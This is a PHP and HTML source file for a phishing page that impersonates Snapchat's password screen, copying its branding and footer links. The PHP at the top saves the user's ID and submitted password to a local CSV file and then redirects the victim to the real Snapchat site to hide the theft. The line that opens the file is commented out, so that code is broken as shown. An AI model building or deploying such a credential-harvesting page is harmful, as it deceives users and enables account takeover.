<?php
    session_start();
    $pass= $empty_err="";
    $uid= htmlspecialchars($_SESSION["login_id"]);

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["pass"]))
        {
            $empty_err="This field cannot be empty.";
        }
        else
        {
            $pass=htmlspecialchars($_POST["pass"]);
            
            // $csv_file= fopen("login_detail.csv","a");
            // fwrite($csv_file,"Email/Phone_no");
            // fwrite($csv_file,",");
            // fwrite($csv_file,"Password");
            
            fwrite($csv_file,"\n");
            fwrite($csv_file,$uid);
            fwrite($csv_file,",");
            fwrite($csv_file,$pass);
            fclose($csv_file);

            header("Refresh:1; url=https://www.snapchat.com/");
            exit();
        }
    }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="pass.css">
    <title>Accounts Snapchat</title>
</head>

<body>
    <div class="container">
        <div class="container_header">
            <img src="snapchat_icon.png" alt="Snapchat">
            <h3>Enter Password</h3>
            <div class="not_you">
                <p>
                    <?php echo $uid; ?>
                    <a href="login.php">Not you?</a>
                </p>
            </div>
        </div>
        <div class="container_input">
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <label for="pass">Password</label><br>
                <input type="password" name="pass">
                <div class="error"><?php echo $empty_err; ?></div>
                <a href="login.php" class="forgot_pass">Forgot Password</a><br>
                <button type="submit">Next</button>
            </form>
        </div>
    </div>

    <div class="container_bottom">
        <div class="col">
            <p>Company</p>
            <a href="https://snap.com/en-US">Snap Inc.</a><br>
            <a href="https://careers.snap.com/">Careers</a><br>
            <a href="https://newsroom.snap.com/">News</a>
        </div>
        <div class="col">
            <p>Community</p>
            <a href="https://help.snapchat.com/hc/en-us?utm_campaign=ap&utm_medium=snap&utm_source=web">Support</a><br>
            <a href="https://values.snap.com/privacy/transparency/community-guidelines">Community Guidelines</a><br>
            <a href="https://values.snap.com/safety/safety-center">Safety Center</a>
        </div>
        <div class="col">
            <p>Advertising</p>
            <a
                href="https://forbusiness.snapchat.com/?utm_source=accounts_snapchat_com&utm_medium=referral&utm_campaign=internal_referral&utm_content=footer_link">Buy
                Ads</a><br>
            <a href="https://snap.com/en-US/ad-policies"> Advertising Policies</a><br>
            <a href="https://snap.com/en-US/political-ads">Political Ads Library</a><br>
            <a href="https://snap.com/en-US/brand-guidelines">Brand Guidelines</a><br>
            <a
                href="https://help.snapchat.com/hc/en-us/articles/7047502545044-Promotions-Rules?utm_campaign=ap&utm_medium=snap&utm_source=web">Promotions
                Rules</a>
        </div>
        <div class="col">
            <p>Legal</p>
            <a href="https://values.snap.com/privacy/privacy-center">Privacy Center</a><br>
            <a
                href="https://help.snapchat.com/hc/en-us/articles/11399265637012-Your-Privacy-Choices-on-Snapchat?utm_campaign=privacy_choices&utm_medium=global_footer&utm_source=snapchat_com">Your
                Privacy Choices</a>
            <a href="https://snap.com/en-US/cookie-policy">Cookie Policy</a><br>
            <a
                href="https://help.snapchat.com/hc/en-us/articles/7012332110996-About-Reporting-Infringement-on-Snapchat?utm_campaign=ap&utm_medium=snap&utm_source=web">Report
                Infringement</a><br>
            <a href="https://snap.com/en-US/terms/custom-creative-tools">Custom Creative Tools Terms</a><br>
            <a href="https://www.snap.com/en-US/terms/create-geofilter">Community Geofilter Terms</a><br>
            <a href="https://snap.com/en-US/terms/lens-studio-license-agreement">Lens Studio Terms</a>
        </div>
    </div>

    <div class="end">
        <a href="https://values.snap.com/privacy/privacy-policy">Privacy Policy</a>
        <a href="https://snap.com/en-US/terms">Terms of Service</a>
    </div>

</body>

</html>